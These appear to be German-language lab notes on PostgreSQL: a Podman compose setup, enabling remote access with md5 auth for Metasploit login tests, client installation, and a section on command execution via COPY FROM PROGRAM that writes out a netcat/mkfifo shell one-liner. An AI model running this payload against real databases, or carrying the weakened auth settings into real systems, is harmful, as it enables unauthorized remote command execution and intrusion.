Postgres

# Konfiguration


## Podman Container

lokales Environment-File erzeugen

~/.env:

```
export POSTGRES_PASSWORD=""
export POSTGRES_USER="analyzer"
export POSTGRES_DB="sanalyzer"
export POSTGRES_INITDB_ARGS="--auth-host=scram-sha-256"
export POSTGRES_HOST_AUTH_METHOD="scram-sha-256"
```

compose.yaml:
```
# Use postgres/example user/password credentials

services:

  db:
    image: postgres
    restart: always
    # set shared memory limit when using docker compose
    shm_size: 128mb
    # or set shared memory limit when deploy via swarm stack
    #volumes:
    #  - type: tmpfs
    #    target: /dev/shm
    #    tmpfs:
    #      size: 134217728 # 128*2^20 bytes = 128Mb
    environment: 
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD}
      POSTGRES_USER: ${POSTGRES_USER}
      POSTGRES_DB: ${POSTGRES_DB}
      POSTGRES_HOST_AUTH_METHOD: ${POSTGRES_HOST_AUTH_METHOD}
      POSTGRES_INITDB_ARGS: ${POSTGRES_INITDB_ARGS}


  adminer:
    image: adminer
    restart: always
    ports:
      - 8080:8080
```

Container starten mit: `p compose up -d`

Adminer läuft auf Port 8080.




## Remote Access ermöglichen

1. /etc/postgresql/14/main/postgresql.conf

```
    # Listen Adresse auf alle Interfaces setzen
      listen_addresses = '*' 

    # password_encryption
    password_encryption = md5    # scram-sha-256 or md5

    *Password Encryption sollte man auf dem default-Wert "scram-sha-256" lassen. Für metasploit Tests kann man das auf 
    md5 setzen. Wenn vorher aber User/Role mit scram-sha-256 angelegt wurden, sind die Passwörter mit dem Verfahren 
    verschlüsselt worden. Daher muss man die Passwörter neu vergeben, ansonsten liefert Metasploit folgende Fehlermeldung 
    beim exploit "scanner/postgres/postgres_login"*

    .. code-block:: shell

        [-] <IP>:5432 - LOGIN FAILED: admin:admin@mydb (Incorrect: unknown auth type '10' with buffer content:
        52 00 00 00 17 00 00 00 0a 53 43 52 41 4d 2d 53    |R........SCRAM-S|
        48 41 2d 32 35 36 00 00                            |HA-256..|
    
```

2. /etc/postgresql/14/main/pg_hba.conf

```   
    # Netzwerkbereich zulassen, der zugreifen darf
      host    all             all             <IP Netz>/24        md5
```

3. systemctl restart postgresql
4. lsof -i:5432
5. less /var/log/postgresql/postgresql-14-main.log
6. psql -h <IP> -p 5432 -d <DB> -U <user> -W


## Command Execution with COPY Command

Quelle: `<https://medium.com/r3d-buck3t/command-execution-with-postgresql-copy-command-a79aef9c2767>`_

In diesem Szenario erfolgt eine remote Anmeldung an die postgres-Datenbank; es wird ein Listener eingerichtet, um beliebige
Befehle auf dem Zielhost abzusetzen. 

1. Anmelden an Datenbanken mit Admin-User::
   
    psql -h <Zielhost> -U <User> -d <Datenbank> -W

2. Remote Listener einrichten::
   
    COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc -l <Zielhost> <PORT> > /tmp/f';

3. in einer neuen Shell können dann bash Befehle abgesetzt werden::
   
    nc <Zielhost> <PORT> 
   
   Befehle werden im Kontext des postgres-Serverprocesses ausgeführt.



## Lokaler Client 

**Add the PGDG repo**

`sudo sh -c 'echo "deb http://apt.postgresql.org/pub/repos/apt $(lsb_release -cs)-pgdg main" > /etc/apt/sources.list.d/pgdg.list'`

**Import the repository signing Keys**

`curl -fsSL https://www.postgresql.org/media/keys/ACCC4CF8.asc | sudo gpg --dearmor -o /etc/apt/trusted.gpg.d/postgresql.gpg`

**Update Your Package Index again**

`sudo apt update`

**Install PostgreSQL Version 18 Client**

`sudo apt -y install postgresql-client-18`
